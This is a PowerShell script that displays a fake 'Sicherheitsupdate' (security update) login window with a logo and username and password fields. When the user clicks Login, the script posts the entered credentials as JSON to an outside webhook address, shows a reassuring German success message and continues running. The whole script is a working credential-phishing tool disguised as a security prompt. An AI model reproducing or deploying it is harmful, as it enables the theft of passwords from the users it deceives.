Add-Type -AssemblyName System.Windows.Forms

# Create a login form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Sicherheitsupdate"
$form.Width = 270
$form.Height = 220
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle
$form.MaximizeBox = $false
$form.MinimizeBox = $false

# Create a picture box for the image
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Location = New-Object System.Drawing.Point(10, 20)
$pictureBox.Size = New-Object System.Drawing.Size(80, 80)
$pictureBox.Image = [System.Drawing.Image]::FromFile("$env:USERPROFILE\logo2.png")
$pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom

# Create a label for the username
$usernameLabel = New-Object System.Windows.Forms.Label
$usernameLabel.Text = "Username:"
$usernameLabel.AutoSize = $true
$usernameLabel.Location = New-Object System.Drawing.Point(120, 40)

# Create a textbox for the username
$usernameTextBox = New-Object System.Windows.Forms.TextBox
$usernameTextBox.Location = New-Object System.Drawing.Point(120, 60)
$usernameTextBox.Width = 100

# Create a label for the password
$passwordLabel = New-Object System.Windows.Forms.Label
$passwordLabel.Text = "Password:"
$passwordLabel.AutoSize = $true
$passwordLabel.Location = New-Object System.Drawing.Point(120, 90)

# Create a textbox for the password
$passwordTextBox = New-Object System.Windows.Forms.TextBox
$passwordTextBox.Location = New-Object System.Drawing.Point(120, 110)
$passwordTextBox.Width = 100
$passwordTextBox.PasswordChar = "*"

# Create a login button
$loginButton = New-Object System.Windows.Forms.Button
$loginButton.Text = "Login"
$loginButton.Location = New-Object System.Drawing.Point(120, 140)
$loginButton.Width = 70

# Add controls to the form
$form.Controls.Add($pictureBox)
$form.Controls.Add($usernameLabel)
$form.Controls.Add($usernameTextBox)
$form.Controls.Add($passwordLabel)
$form.Controls.Add($passwordTextBox)
$form.Controls.Add($loginButton)

$loginButton.Add_Click({
    $username = $usernameTextBox.Text
    $password = $passwordTextBox.Text

    if (($username -ne "") -and ($password -ne "")) {
        # Send login data to webhook address
        $webhookUrl = "<url>"
        $payload = @{
            "username" = $username
            "password" = $password
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"

        [System.Windows.Forms.MessageBox]::Show("Erfolgreich bestätigt!", "Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Login failed!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
})

# Show the login form and handle the result
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    # Rest of your script goes here
    # ...
    Write-Host "Continuing script execution..."
}
